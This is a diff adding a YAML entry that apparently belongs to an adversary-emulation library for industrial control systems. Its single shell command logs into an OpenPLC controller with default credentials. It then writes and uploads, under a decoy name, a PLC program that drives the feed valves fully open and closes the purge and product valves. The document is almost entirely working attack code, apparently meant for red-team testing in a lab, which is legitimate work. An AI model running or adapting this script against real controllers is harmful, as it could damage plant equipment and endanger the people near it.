@@ -1,0 +1,52 @@
+---
+
+- id: c9d0e1f2-9999-9999-9999-000000000005
+  name: OpenPLC - Upload Masqueraded Malicious Logic
+  description: |
+    Same two-step upload as b2c3d4e5-2222-2222-2222-000000000003: /upload-program then
+    /upload-program-action. Local file named 326339.st is stored under a random server
+    name; filename for compile is written to /tmp/plc_last_st_file.txt.
+  tactic: evasion
+  technique_id: T0849
+  technique_name: Masquerading
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      curl -s -c /tmp/plc_cookies.txt -d "username=openplc&password=openplc"
+      "http://192.168.95.2:8080/login" -o /dev/null &&
+      printf 'PROGRAM main1\n' > /tmp/326339.st &&
+      printf '  VAR\n' >> /tmp/326339.st &&
+      printf '    f1_valve_sp AT %%QW100 : UINT;\n' >> /tmp/326339.st &&
+      printf '    f2_valve_sp AT %%QW101 : UINT;\n' >> /tmp/326339.st &&
+      printf '    purge_valve_sp AT %%QW102 : UINT;\n' >> /tmp/326339.st &&
+      printf '    product_valve_sp AT %%QW103 : UINT;\n' >> /tmp/326339.st &&
+      printf '    run_bit AT %%QX5.0 : BOOL := TRUE;\n' >> /tmp/326339.st &&
+      printf '  END_VAR\n' >> /tmp/326339.st &&
+      printf '  f1_valve_sp := 65535;\n' >> /tmp/326339.st &&
+      printf '  f2_valve_sp := 65535;\n' >> /tmp/326339.st &&
+      printf '  purge_valve_sp := 0;\n' >> /tmp/326339.st &&
+      printf '  product_valve_sp := 0;\n' >> /tmp/326339.st &&
+      printf '  run_bit := TRUE;\n' >> /tmp/326339.st &&
+      printf 'END_PROGRAM\n' >> /tmp/326339.st &&
+      printf 'CONFIGURATION Config0\n' >> /tmp/326339.st &&
+      printf '  RESOURCE Res0 ON PLC\n' >> /tmp/326339.st &&
+      printf '    TASK task0(INTERVAL := T#20ms, PRIORITY := 0);\n' >> /tmp/326339.st &&
+      printf '    PROGRAM instance0 WITH task0 : main1;\n' >> /tmp/326339.st &&
+      printf '  END_RESOURCE\n' >> /tmp/326339.st &&
+      printf 'END_CONFIGURATION\n' >> /tmp/326339.st &&
+      curl -s -b /tmp/plc_cookies.txt -F "file=@/tmp/326339.st"
+      "http://192.168.95.2:8080/upload-program"
+      -o /tmp/plc_upload_form_masq.html &&
+      FN=$(grep -oE '[0-9]+[.]st' /tmp/plc_upload_form_masq.html | head -1) &&
+      echo "PARSED_ST_FILENAME=$FN" &&
+      test -n "$FN" &&
+      curl -s -b /tmp/plc_cookies.txt -X POST "http://192.168.95.2:8080/upload-program-action"
+      -d "prog_name=326339_clone"
+      -d "prog_descr=masquerade"
+      -d "prog_file=$FN"
+      -d "epoch_time=$(date +%s)"
+      -o /tmp/plc_upload_action_masq.html &&
+      echo "$FN" > /tmp/plc_last_st_file.txt &&
+      echo "MASQUERADED_UPLOAD_DONE"
+    timeout: 120
